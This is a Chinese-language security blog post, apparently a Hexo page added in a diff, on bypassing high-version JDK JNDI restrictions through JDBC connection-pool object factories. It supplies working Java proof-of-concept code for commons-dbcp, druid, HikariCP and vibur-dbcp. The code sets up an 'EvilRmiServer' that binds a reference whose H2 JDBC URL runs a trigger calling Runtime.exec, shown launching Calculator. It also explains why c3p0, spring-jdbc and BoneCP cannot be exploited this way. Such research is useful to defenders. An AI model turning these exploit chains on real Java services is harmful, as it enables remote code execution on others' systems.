@@ -1,0 +1,690 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言最初是在浅蓝师傅的JNDI高版本绕过里见到的，最近又碰到了，当时学的也不太全面，这里回过头学一下，对常见的连接池的利用做一个总结 同样的这些也可以作为高版本JDK绕过的getter sinks，本文全篇利用H2数据库用作来演示攻击。 dbcp可以直接参考https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1405&#x2F;#toc_dbcp 分为tomcat dbcp和commons-dbcp, 每">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI高版本绕过之JDBCAttack总结">
+<meta property="og:url" content="http://example.com/2024/06/06/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E4%B9%8BJDBCAttack%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言最初是在浅蓝师傅的JNDI高版本绕过里见到的，最近又碰到了，当时学的也不太全面，这里回过头学一下，对常见的连接池的利用做一个总结 同样的这些也可以作为高版本JDK绕过的getter sinks，本文全篇利用H2数据库用作来演示攻击。 dbcp可以直接参考https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1405&#x2F;#toc_dbcp 分为tomcat dbcp和commons-dbcp, 每">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606153556479.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606160251340.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606160310805.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606160705343.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606160714169.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606163536294.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606163618343.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606165030499.png">
+<meta property="og:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606165135834.png">
+<meta property="article:published_time" content="2024-06-06T07:01:14.000Z">
+<meta property="article:modified_time" content="2024-06-19T07:15:53.984Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="java security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/JNDI_WITH_JDBC/image-20240606153556479.png">
+  
+  
+  
+  <title>JNDI高版本绕过之JDBCAttack总结 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="JNDI高版本绕过之JDBCAttack总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-06 15:01" pubdate>
+          June 6, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          988 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">JNDI高版本绕过之JDBCAttack总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最初是在浅蓝师傅的JNDI高版本绕过里见到的，最近又碰到了，当时学的也不太全面，这里回过头学一下，对常见的连接池的利用做一个总结</p>
+<p>同样的这些也可以作为高版本JDK绕过的getter sinks，本文全篇利用H2数据库用作来演示攻击。</p>
+<h1 id="dbcp"><a href="#dbcp" class="headerlink" title="dbcp"></a>dbcp</h1><p>可以直接参考<a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/#toc_dbcp">https://tttang.com/archive/1405/#toc_dbcp</a></p>
+<p>分为tomcat dbcp和commons-dbcp, 每个又分为两个版本，看情况修改factory名字即可, 这里测试用的是commons-dbcp 1.4的factory</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilRmiServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lanuchRMIregister</span><span class="hljs-params">(Integer rmi_port)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        System.out.println(<span class="hljs-string">&quot;Creating RMI Registry, RMI Port:&quot;</span>+rmi_port);<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(rmi_port);<br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> exec();<br><br>        <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(ref);<br>        registry.bind(<span class="hljs-string">&quot;Exploit&quot;</span>, referenceWrapper);<br>        System.out.println(referenceWrapper.getReference());<br>        <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;org.apache.commons.dbcp.BasicDataSourceFactory&quot;</span>;<br><br>        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,factory,<span class="hljs-literal">null</span>);<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>                <span class="hljs-string">&quot;$$\n&quot;</span>;<br><br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>));<br>        ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>        <span class="hljs-keyword">return</span> ref;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        lanuchRMIregister(<span class="hljs-number">1099</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>测试：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();        initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/Exploit&quot;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>其他：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSourceFactory</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.BasicDataSourceFactory</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSourceFactory</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.dbcp</span>.BasicDataSourceFactory<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="tomcat-jdbc"><a href="#tomcat-jdbc" class="headerlink" title="tomcat-jdbc"></a>tomcat-jdbc</h1><p>修改factory为org.apache.tomcat.jdbc.pool.DataSourceFactory 即可</p>
+<h1 id="druid"><a href="#druid" class="headerlink" title="druid"></a>druid</h1><p>测试用的druid最新版1.2.23仍然可以打。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>;<br><br>    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,factory,<span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>            <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>            <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>            <span class="hljs-string">&quot;$$\n&quot;</span>;<br><br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_USER</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">JDBC_PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;password&quot;</span>;<br><br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;driverClassName&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;url&quot;</span>,JDBC_URL));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;username&quot;</span>,JDBC_USER));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;password&quot;</span>,JDBC_PASSWORD));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;initialSize&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;init&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>));<br><br>    <span class="hljs-keyword">return</span> ref;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="HikariCP"><a href="#HikariCP" class="headerlink" title="HikariCP"></a>HikariCP</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title">exec</span>()</span> &#123;<br>        ResourceRef <span class="hljs-keyword">ref</span> = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;com.zaxxer.hikari.HikariJNDIFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        String JDBC_URL = <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>                <span class="hljs-string">&quot;$$\n&quot;</span>;<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;jdbcUrl&quot;</span>, JDBC_URL));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">ref</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>com.zaxxer.hikari.HikariJNDIFactory</p>
+<h1 id="vibur-dbcp"><a href="#vibur-dbcp" class="headerlink" title="vibur-dbcp"></a>vibur-dbcp</h1><p>找了个小众的组件看了看。</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606153556479.png" srcset="/img/loading.gif" lazyload alt="image-20240606153556479"></p>
+<p>dataSource.start() 明显就是连接的逻辑。</p>
+<p>直接给poc：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ResourceRef <span class="hljs-title">exec</span>()</span> &#123;<br>        ResourceRef <span class="hljs-keyword">ref</span> = <span class="hljs-keyword">new</span> ResourceRef(<span class="hljs-string">&quot;javax.sql.DataSource&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.vibur.dbcp.ViburDBCPObjectFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;driverClassName&quot;</span>, <span class="hljs-string">&quot;org.h2.Driver&quot;</span>));<br>        String JDBC_URL = <span class="hljs-string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +<br>                <span class="hljs-string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +<br>                <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;&quot;</span>+<span class="hljs-string">&quot;open -a Calculator&quot;</span>+<span class="hljs-string">&quot;&#x27;)\n&quot;</span> +<br>                <span class="hljs-string">&quot;$$\n&quot;</span>;<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;jdbcUrl&quot;</span>, JDBC_URL));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;username&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-keyword">ref</span>.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">new</span> StringRefAddr(<span class="hljs-string">&quot;password&quot;</span>,<span class="hljs-string">&quot;&quot;</span>));<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">ref</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="其他没法利用的"><a href="#其他没法利用的" class="headerlink" title="其他没法利用的"></a>其他没法利用的</h1><h2 id="c3p0"><a href="#c3p0" class="headerlink" title="c3p0"></a>c3p0</h2><p>C3p0 低版本0.9只有一个JavaBeanObjectFactory, 可能有点用吧可以调用任意seter。</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606160251340.png" srcset="/img/loading.gif" lazyload alt="image-20240606160251340"></p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606160310805.png" srcset="/img/loading.gif" lazyload alt="image-20240606160310805"></p>
+<p>此处newInstance也没参数可控。</p>
+<p>还有一处反序列化：</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606160705343.png" srcset="/img/loading.gif" lazyload alt="image-20240606160705343"></p>
+<p>SerializableUtils#deserializeFromByteArray</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606160714169.png" srcset="/img/loading.gif" lazyload alt="image-20240606160714169"></p>
+<p>JNDI本身就能打反序列化，意义也不大。</p>
+<p>稍微高点的版本分了两个包，在mchange-commons-java里，多了一个实现ObjectFactory的类：</p>
+<p>DriverManagerDataSource.DmdsObjectFactory#getObjectInstance</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606163536294.png" srcset="/img/loading.gif" lazyload alt="image-20240606163536294"></p>
+<p>这里new了个DriverManagerDataSource，但是很可惜DriverManagerDataSource构造函数就是个赋值，也没法利用</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606163618343.png" srcset="/img/loading.gif" lazyload alt="image-20240606163618343"></p>
+<h2 id="spring-jdbc"><a href="#spring-jdbc" class="headerlink" title="spring-jdbc"></a>spring-jdbc</h2><p>出于好奇看了下spring-jdbc这种应该很热门的东西为啥文章里没，全局搜索了下jar包根本就没有implements ObjectFactory的类。</p>
+<p>试了2.0 3.0 和6.x的几个版本，也是没有。所以没法利用。</p>
+<h2 id="BoneCP"><a href="#BoneCP" class="headerlink" title="BoneCP"></a>BoneCP</h2><p>这个倒是有，但是他的getObjectInstance没连接逻辑。</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606165030499.png" srcset="/img/loading.gif" lazyload alt="image-20240606165030499"></p>
+<p>上面都是属性设置，可能有用的就最后两行。</p>
+<p>看看BoneCPDataSource的构造函数</p>
+<p><img src="/../JNDI_WITH_JDBC/image-20240606165135834.png" srcset="/img/loading.gif" lazyload alt="image-20240606165135834"></p>
+<p>反射赋个值，也是利用不了。</p>
+<p>参考文章或项目：</p>
+<p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14044">https://xz.aliyun.com/t/14044</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p>
+<p>w</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java-security/" class="print-no-link">#java security</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
